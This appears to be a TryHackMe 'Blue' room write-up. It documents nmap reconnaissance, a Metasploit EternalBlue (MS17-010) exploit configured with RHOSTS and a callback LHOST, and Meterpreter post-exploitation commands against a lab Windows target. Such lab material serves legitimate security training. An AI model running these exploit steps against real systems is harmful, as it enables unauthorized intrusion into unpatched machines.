# Blue

## Room Information

- **Platform:** TryHackMe
- **Room:** Blue
- **Difficulty:** Easy
- **Category:** Windows Exploitation

---

# Objective

The objective of this room was to identify a vulnerable Windows machine, exploit the MS17-010 (EternalBlue) vulnerability using Metasploit, gain initial access, and perform post-exploitation in a controlled lab environment.

---

# Topics Covered

- Network Reconnaissance
- Service Enumeration
- SMB Enumeration
- MS17-010 (EternalBlue)
- Metasploit Framework
- Meterpreter
- Windows Post-Exploitation
- Privilege Escalation

---

# Tools Used

- Nmap
- Metasploit Framework
- Meterpreter
- Kali Linux

---

# Commands Practiced

## Nmap Scan

```bash
nmap -sC -sV <TARGET_IP>
```

## SMB Vulnerability Scan

```bash
nmap --script smb-vuln-ms17-010 <TARGET_IP>
```

## Start Metasploit

```bash
msfconsole
```

## Search for EternalBlue

```bash
search ms17-010
```

## Configure the Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS <TARGET_IP>

set LHOST <YOUR_IP>

run
```

## Meterpreter Commands

```bash
sysinfo

getuid

shell

pwd

ls
```

---

# Key Learnings

- Used Nmap to identify open services.
- Verified the presence of the MS17-010 vulnerability.
- Learned how the Metasploit Framework automates exploitation.
- Gained experience using Meterpreter for post-exploitation.
- Understood the importance of timely security patching to prevent known vulnerabilities.

---

# Skills Gained

- Vulnerability Assessment
- Windows Exploitation
- SMB Enumeration
- Metasploit Framework
- Meterpreter
- Post-Exploitation
- Ethical Penetration Testing

---


<img width="1901" height="382" alt="blue completion" src="https://github.com/user-attachments/assets/54f59be7-9be6-43db-8ea8-4e3f19c6da81" />

## Room Completion


---

# Lessons Learned

This room demonstrated the importance of vulnerability assessment and secure patch management. It provided practical experience with identifying and exploiting a known Windows SMB vulnerability in an authorized lab environment while reinforcing the ethical use of offensive security tools.
